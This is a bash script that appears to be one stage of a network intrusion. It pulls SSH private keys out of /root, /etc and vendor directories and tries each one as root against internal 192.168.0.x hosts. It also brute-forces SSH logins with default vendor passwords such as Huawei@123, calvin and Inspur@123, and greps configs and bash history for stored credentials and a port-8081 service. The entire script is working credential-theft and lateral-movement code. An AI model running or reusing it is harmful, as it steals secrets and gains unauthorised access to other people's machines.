#!/bin/bash
# exec6b: sshpass ladder + harvest from toolkit + 8081 auth hunt
echo "=== ID"; hostname
echo "=== KEYS2"
for f in $(timeout 30 grep -rlaE 'BEGIN (OPENSSH|RSA) PRIVATE KEY' /root /etc /ssd/vendors 2>/dev/null | grep -v '\.venv\|site-packages' | head -6); do
  echo "--- $f"; grep -aE 'ssh-rsa|ssh-ed25519' "$f" | head -2
  awk '/BEGIN .*PRIVATE KEY/{f=1} f{print} /END .*PRIVATE KEY/{f=0}' "$f" | head -40 > /dev/shm/k.tmp
  if grep -q 'PRIVATE KEY' /dev/shm/k.tmp; then chmod 600 /dev/shm/k.tmp; fp=$(ssh-keygen -lf /dev/shm/k.tmp 2>&1 | head -1); echo "FP $fp";
    for h in 192.168.0.28 192.168.0.30 192.168.0.31; do for u in root; do
      r=$(timeout 10 ssh -i /dev/shm/k.tmp -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes $u@$h 'id;hostname' 2>&1 | tail -1)
      echo "K2 $u@$h $fp => ${r:0:100}"; done; done
  fi
done
echo "=== SSHPASS"
LIST="root|123456 root|Admin@123 root|Huawei@123 root|inspur root|calvin admin|admin ubuntu|ubuntu root|Passw0rd root|Inspur@123 root|inspur@123 root|Root@123"
for pair in $LIST; do
  u=${pair%%|*}; p=${pair##*|}
  for h in 192.168.0.28 192.168.0.30 192.168.0.31 192.168.0.20 192.168.0.22; do
    r=$(timeout 12 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 "$u@$h" 'id;hostname' 2>&1 | tail -1)
    case "$r" in *uid=*|*g0023*|*worker*) echo "PWHIT $u@$h passlen=${#p} => ${r:0:100}";; esac
  done
done
echo "=== SSH_AUTHED"; echo done
echo "=== TOOLKITCRED"
timeout 40 grep -rnaE 'sshpass|PASSWORD=|passwd=|ssh -i|scp ' /root/conf 2>/dev/null | cut -c1-190 | head -20
echo "=== H8081"
timeout 40 grep -rna '8081' /root /etc /ssd/vendors --include=*.sh --include=*.py --include=*.json --include=*.js --include=*.conf --include=*.yaml --include=*.env 2>/dev/null | grep -v '\.venv\|node_modules' | cut -c1-190 | head -15
timeout 20 grep -a '8081' /root/.bash_history 2>/dev/null | tail -8 | cut -c1-190
echo "=== DONE"
